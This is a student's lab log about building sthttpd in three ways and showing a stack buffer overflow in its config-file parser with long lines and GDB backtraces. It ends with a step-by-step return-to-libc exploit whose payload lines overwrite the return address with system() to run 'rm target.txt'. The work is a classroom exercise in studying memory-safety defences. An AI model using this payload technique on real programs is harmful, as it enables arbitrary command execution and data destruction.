@@ -1,0 +1,199 @@
+Jack Storch
+304483390
+
+Log
+
+
+First I transfered the tarball to the linux server with: scp /Users/jackstorch/Desktop/sthttpd-2.27.0.tar.gz storch@lnxsrv.seas.ucla.edu:~
+
+Then I ssh into the linux server and changed my gcc to the correct version by making a textfile with: PATH=/usr/local/cs/bin:$PATH  inside of it. 
+Then I logged out and I logged back in to find that I had the correct gcc version. 
+
+Next, I opened the tarball:tar -xvzf sthttpd­2.27.0.tar.gz  and cd into it.
+
+I found the thttpd.c file in the src directory and used nano to change the two lines to what they need to be. 
+
+./configure CFLAGS='­m32' LDFLAGS=”­Xlinker –rpath=/usr/local/cs/gcc­4.9.2/lib” this line then let me build the files. 
+
+then using: 
+
+make clean 
+make CFLAGS='­-m32 -­g3 -­O2 ­fno-­inline ­-fstack­-protector-­strong' 
+mv src/thttpd src/thttpd­-sp
+
+I compiled the thttpd file under these compiler speciffications and then moved it somewhere better.
+
+I then repeated this with the: -m32 -g3 -O2 -fno-inline -fsanitize=address and -m32 -g3 -O2 -fno-inline compiler options to get the other two files needed.
+
+I then made a file called config.cfg that I would use as input to crash these three files.
+
+I ran each file in gdb to see if it broke by writing:
+gdb src/thttpd-sp
+(gdb) run -p [port number] -D -C config.cfg
+and then if I got an error I would get a backtrace in order to find out where it approximately crashed
+
+				  sp 	  as 	  no
+Port numbers-	12642	12643	12644
+
+To get the sp file to crash, my config.cfg file had port=12642#AAAAAAAA... this cause the after the port to be overrriden. I then got thos backtrace after typing bt into gdb:
+#0  uw_frame_state_for (context=context@entry=0xffffb9a8, 
+    fs=fs@entry=0xffffba28) at ../../../../gcc-4.9.2/libgcc/unwind-dw2.c:1253
+#1  0x00158b20 in _Unwind_Backtrace (trace=0xca1670 <backtrace_helper>, 
+    trace_argument=0xffffbb04) at ../../../../gcc-4.9.2/libgcc/unwind.inc:290
+#2  0x00ca1865 in backtrace () from /lib/libc.so.6
+#3  0x00c1274b in __libc_message () from /lib/libc.so.6
+#4  0x00ca4dad in __fortify_fail () from /lib/libc.so.6
+#5  0x00ca4d5a in __stack_chk_fail () from /lib/libc.so.6
+#6  0x0804b69f in read_config (filename=<optimized out>) at thttpd.c:1190
+#7  0x41414141 in ?? ()
+#8  0x41414141 in ?? ()
+#9  0x41414141 in ?? ()
+#10 0x41414141 in ?? ()
+#11 0x41414141 in ?? ()
+#12 0x41414141 in ?? ()
+#13 0x41414141 in ?? ()
+#14 0x41414141 in ?? ()
+#15 0x41414141 in ?? ()
+#16 0x41414141 in ?? ()
+#17 0x41414141 in ?? ()
+#18 0x41414141 in ?? ()
+#19 0x41414141 in ?? ()
+#20 0x41414141 in ?? ()
+#21 0x0a414141 in ?? ()
+#22 0x00000000 in ?? ()
+
+To get the as file to crash, my config.cfg file had a long string of the letter 'A's:
+#0  uw_frame_state_for (context=context@entry=0xffffb8c0, 
+    fs=fs@entry=0xffffb940) at ../../../../gcc-4.9.2/libgcc/unwind-dw2.c:1253
+#1  0x00777b20 in _Unwind_Backtrace (
+    trace=0x16e5e0 <__sanitizer::Unwind_Trace(_Unwind_Context*, void*)>, 
+    trace_argument=0xffffba28) at ../../../../gcc-4.9.2/libgcc/unwind.inc:290
+#2  0x0016ebaf in __sanitizer::StackTrace::SlowUnwindStack (this=0xffffbb28, 
+    pc=1302225, max_depth=1094795585)
+    at ../../../../../gcc-4.9.2/libsanitizer/sanitizer_common/sanitizer_linux_libcdep.cc:168
+#3  0x00171a60 in __sanitizer::StackTrace::Unwind (this=0xffffbb28, 
+    max_depth=256, pc=1302225, bp=4294950824, stack_top=4294959104, 
+    stack_bottom=4284473344, request_fast_unwind=false)
+    at ../../../../../gcc-4.9.2/libsanitizer/sanitizer_common/sanitizer_stacktrace_libcdep.cc:19
+#4  0x00165635 in __asan_report_error (pc=1302225, bp=4294950824, 
+    sp=4294950796, addr=4294950996, is_write=false, access_size=1000)
+    at ../../../../../gcc-4.9.2/libsanitizer/asan/asan_report.cc:776
+#5  0x0013dee6 in __interceptor_strchr (
+    str=0xffffbff0 'A' <repeats 200 times>..., c=35)
+    at ../../../../../gcc-4.9.2/libsanitizer/asan/asan_interceptors.cc:417
+#6  0x0804da70 in read_config (filename=<optimized out>) at thttpd.c:1018
+#7  0x41414141 in ?? ()
+#8  0x41414141 in ?? ()
+#9  0x41414141 in ?? ()
+#10 0x41414141 in ?? ()
+#11 0x41414141 in ?? ()
+#12 0x41414141 in ?? ()
+#13 0x41414141 in ?? ()
+#14 0x41414141 in ?? ()
+#15 0x41414141 in ?? ()
+#16 0x41414141 in ?? ()
+#17 0x41414141 in ?? ()
+#18 0x41414141 in ?? ()
+#19 0x41414141 in ?? ()
+#20 0x41414141 in ?? ()
+#21 0x41414141 in ?? ()
+#22 0x41414141 in ?? ()
+#23 0x41414141 in ?? ()
+#24 0x41414141 in ?? ()
+#25 0x41414141 in ?? ()
+#26 0x41414141 in ?? ()
+#27 0x41414141 in ?? ()
+#28 0x41414141 in ?? ()
+#29 0x41414141 in ?? ()
+#30 0x41414141 in ?? ()
+#31 0x41414141 in ?? ()
+#32 0x41414141 in ?? ()
+#33 0x41414141 in ?? ()
+#34 0x41414141 in ?? ()
+#35 0x41414141 in ?? ()
+#36 0x41414141 in ?? ()
+#37 0x41414141 in ?? ()
+#38 0x41414141 in ?? ()
+#39 0x41414141 in ?? ()
+#40 0x41414141 in ?? ()
+#41 0x41414141 in ?? ()
+#42 0x41414141 in ?? ()
+#43 0x41414141 in ?? ()
+#44 0x41414141 in ?? ()
+
+To get the no file to crash, I did the same thing as the sp file and got a backtrace of:
+#0  0x41414141 in ?? ()
+#1  0x41414141 in ?? ()
+#2  0x41414141 in ?? ()
+#3  0x41414141 in ?? ()
+#4  0x41414141 in ?? ()
+#5  0x41414141 in ?? ()
+#6  0x41414141 in ?? ()
+#7  0x41414141 in ?? ()
+#8  0x41414141 in ?? ()
+#9  0x41414141 in ?? ()
+#10 0x41414141 in ?? ()
+#11 0x41414141 in ?? ()
+#12 0x41414141 in ?? ()
+#13 0x41414141 in ?? ()
+#14 0x41414141 in ?? ()
+#15 0x0a414141 in ?? ()
+#16 0x00000000 in ?? ()
+
+Next to get the three .s files I input:
+
+gcc -I .. -I . -m32 -S -O2 -fno-inline thttpd.c -o thttpd-no.s
+
+with the correct -f flags for each one. This gave me the correct assembly code which I then transefered to my computer through the use of the scp command in a manner like:
+
+scp -r storch@lnxsrv.seas.ucla.edu:sthttpd-2.27.0/src/thttpd-sp.s /Users/jackstorch/Desktop
+
+9.
+For the last part, I downloaded a hex to ASCII converter, Text Fiend, to get the character representation of numbers. 
+
+I made a text file called test.txt and put in:
+
+	#max_age=rm target.txt 00000000000000000000000000000000000000000000000000000000000000000000000000000mmmmqqqqyyyyttttoooovvvvddddxxxxwwwwllllrrrrkkkkzzzz
+
+This will then be the exploit to delete the target.txt file in src. 
+I put a null byte right after “txt” so that the machine can end the remove instruction at the right point. 
+There are 100 0's to ensure that overflow will occur before the characters. 
+The letters are grouped into fours because the return address is 32 bits, 
+therefore when the program crashes at the return address, I can then put in the address of the rm command and therefore have the program remove it.
+I ran NO with gdb using the following lines:
+
+	gdb thttpd-no 
+	r -p 12644 -D -C test.txt
+
+This crashed and the return address to be at 0x78787878, which is ‘xxxx’ in ASCII so the x's must change.
+To find out the address of the rm instructions I typed “p system” in GDB   
+This value was ‘0x1f9f70’. Therefore test.txt was changed so that the spot that contained ‘xxxx’ is ‘pü  ’ which is its ASCII representation. 
+Also, because the machine is in little endian, I had to reverse the order of the bytes:
+
+	#max_age=rm target.txt 00000000000000000000000000000000000000000000000000000000000000000000000000000mmmmmqqqqyyyyttttoooovvvvddddpü  wwwwrrrrkkkkzzzz
+
+After changing test.txt to this, I then ran the NO again:
+
+	gdb thttpd-no 
+	r -p 12644 -D -C test.txt
+
+This then showed the return address to be at 0x77777777. 
+This indicated that the 4 bytes after these 4 bytes needed to be replaced with the memory location of where the rm instrcution is. 
+To get this value I typed the following:
+
+	(gdb) b 1190
+	(gdb) r -p 12644 -D -C test.txt
+	(gdb) print &line
+
+Which outputted “$1 = (char (*)[100]) 0xffffc18c” which indicates the address of the first character in the string. 
+Therefore I had to add 9 to this memory location to get to the r which is ‘0xffffc195’
+Now test.txt has changed so that  ‘rrrr’ is he ASCII representation of ‘0x95c1ffff’ so 'ï¡ˇˇ':
+
+	#max_age=rm target.txt 00000000000000000000000000000000000000000000000000000000000000000000000000000mmmmcqqqqyyyyttttoooovvvvddddpü  wwwwï¡ˇˇkkkkzzzz
+
+Finally, I ran NO again with the updated test.txt file and target.txt was successfully deleted. 
+
+This only works assuming no stack randomization is happening between the running of each program. Stack randomization doesnt happen in GDB but does happen when you load gdb.
+
+
+
